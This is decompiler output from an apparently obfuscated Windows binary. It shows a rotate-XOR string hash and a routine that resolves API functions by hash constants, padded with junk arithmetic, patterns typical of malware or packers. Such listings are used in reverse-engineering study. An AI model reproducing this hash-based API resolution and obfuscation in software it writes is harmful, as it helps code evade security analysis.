void __userpurge sub_40E528(__int16 a1@<ax>, int a2@<ecx>, int a3@<ebp>, int a4)
{
  if ( (a1 & 0x3C8D) != 0 && !a2 )
    *(_DWORD *)(a3 - 256) -= *(unsigned __int16 *)(a3 - 352);
  JUMPOUT(0x40DD20);
}
// 40D1D2: control flows out of bounds to 40DD20

//----- (0040E5D4) --------------------------------------------------------
unsigned int __cdecl sub_40E5D4(_BYTE *a1)
{
  unsigned int result; // eax

  result = 0;
  while ( *a1 )
    result = (char)*a1++ ^ ((result >> 25) | (result << 7));
  return result;
}

//----- (0040E6DC) --------------------------------------------------------
char *__usercall sub_40E6DC@<eax>(char a1@<cf>, int a2@<edi>, int a3@<esi>)
{
  unsigned int v3; // edx
  LONG (__stdcall **v4)(volatile LONG *); // ebx
  int v5; // ebx
  int v6; // esi
  int v7; // ebx
  char *result; // eax
  int v9; // edx
  int v10; // esi
  int v11; // esi
  int v12; // [esp-4h] [ebp-4h]

  v7 = dword_4446FC;
  result = sub_40D955(a2 - 2034, a1 + a3 + 21273, 262468866);
  v10 = v9 + 3921;
  dword_44302C = 16034;
  dword_443030 += v10;
  if ( !result )
    goto LABEL_8;
  dword_444A4E = (int (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
  dword_443024 = dword_4446B4 + v7;
  LOBYTE(dword_443048) = dword_443048 + 67;
  result = sub_40D955(dword_444234, v10, 1493072574);
  dword_44303C = 8705;
  if ( !result )
    goto LABEL_8;
  dword_444BA9 = (int (__stdcall *)(_DWORD, _DWORD))result;
  LOBYTE(dword_443020) = 9;
  result = sub_40D955(__CFADD__(v12, 9440) + dword_4449AC + 31536 + 20235, (int)&GetModuleHandleA, 150532372);
  dword_443038 = 5105;
  if ( !result )
    goto LABEL_8;
  dword_444B8D = (__int64 (__thiscall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
  v6 = (__PAIR64__((__PAIR64__(&GetModuleHandleA, v3) - 0x3E5800004EE3i64) >> 32, dword_443030) + 0x465500003026i64) >> 32;
  dword_443030 += 12326;
  result = sub_40D955(loc_4438D8 + 23371, v6, 1916711125);
  LOBYTE(dword_44301C) = 58;
  dword_443004 += v6;
  if ( !result )
    goto LABEL_8;
  dword_443038 += loc_4438D8 + 23371;
  dword_444B9D = (int (__thiscall *)(_DWORD))result;
  result = sub_40D955(18457, dword_4432AC + v6, -2114916129);
  if ( !result )
    goto LABEL_8;
  dword_444A3E = (int (__thiscall *)(_DWORD, _DWORD))result;
  v4 = &InterlockedDecrement;
  result = sub_40D955(18579, (int)&DisableThreadLibraryCalls, 1216340331);
  v11 = (int)&DisableThreadLibraryCalls - dword_4439E0;
  BYTE1(v4) = byte_444038;
  if ( !result )
    goto LABEL_8;
  dword_444BC5 = (int (__fastcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
  dword_443018 += (int)v4;
  dword_443038 = (int)&DisableThreadLibraryCalls - dword_4439E0;
  v5 = (unsigned int)v4 ^ 0x1975;
  result = sub_40D955(18579, v11, 255840707);
  dword_443034 = 21612;
  dword_443048 -= v11;
  if ( result )
  {
    dword_444A4A = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))result;
    sub_40D9EE((unsigned __int16)&LocalAlloc >> 8, v5);
    LOBYTE(dword_443048) = 105;
    dword_443008 += 15640;
    dword_443018 -= 10470;
    return (char *)&HeapDestroy;
  }
  else
  {
LABEL_8:
    dword_443034 -= 936;
  }
  return result;
}
// 40E705: variable 'v9' is possibly undefined
// 40B7E4: variable 'v12' is possibly undefined
// 40D3BF: variable 'v3' is possibly undefined
// 443004: using guessed type int dword_443004;
// 443008: using guessed type int dword_443008;
// 443018: using guessed type int dword_443018;
// 44301C: using guessed type int dword_44301C;
// 443020: using guessed type int dword_443020;
// 443024: using guessed type int dword_443024;
// 44302C: using guessed type int dword_44302C;
// 443030: using guessed type int dword_443030;
// 443034: using guessed type int dword_443034;
// 443038: using guessed type int dword_443038;
// 44303C: using guessed type int dword_44303C;
// 443048: using guessed type int dword_443048;
// 4432AC: using guessed type int dword_4432AC;
// 4439E0: using guessed type int dword_4439E0;
// 444038: using guessed type char byte_444038;
// 444234: using guessed type int dword_444234;
// 4446B4: using guessed type int dword_4446B4;
// 4446FC: using guessed type int dword_4446FC;
// 4449AC: using guessed type int dword_4449AC;
// 444A3E: using guessed type int (__thiscall *dword_444A3E)(_DWORD, _DWORD);
// 444A4A: using guessed type int (__stdcall *dword_444A4A)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 444A4E: using guessed type int (__thiscall *dword_444A4E)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 444B8D: using guessed type __int64 (__thiscall *dword_444B8D)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 444B9D: using guessed type int (__thiscall *dword_444B9D)(_DWORD);
// 444BA9: using guessed type int (__stdcall *dword_444BA9)(_DWORD, _DWORD);
// 444BAD: using guessed type int dword_444BAD;
// 444BC5: using guessed type int (__fastcall *dword_444BC5)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0040E9D0) --------------------------------------------------------
int __userpurge sub_40E9D0@<eax>(int a1@<eax>, int a2@<ecx>, int a3, int a4)
{
  int v4; // eax
  int v6; // [esp-14Ch] [ebp-150h]
  int v7; // [esp-30h] [ebp-34h]

  sub_406936(a1, a2, v6);
  v4 = sub_409714(0, v7, 1710982647, 146071130) | 0x3280;
  return (__PAIR64__(v4 - 13398, v4) - 0x3FCD00003456i64) >> 32;
}
// 40E73F: variable 'v6' is possibly undefined
// 40D35F: variable 'v7' is possibly undefined

// nfuncs=44 queued=43 decompiled=43 lumina nreq=0 worse=0 better=0
// ALL OK, 43 function(s) have been successfully decompiled
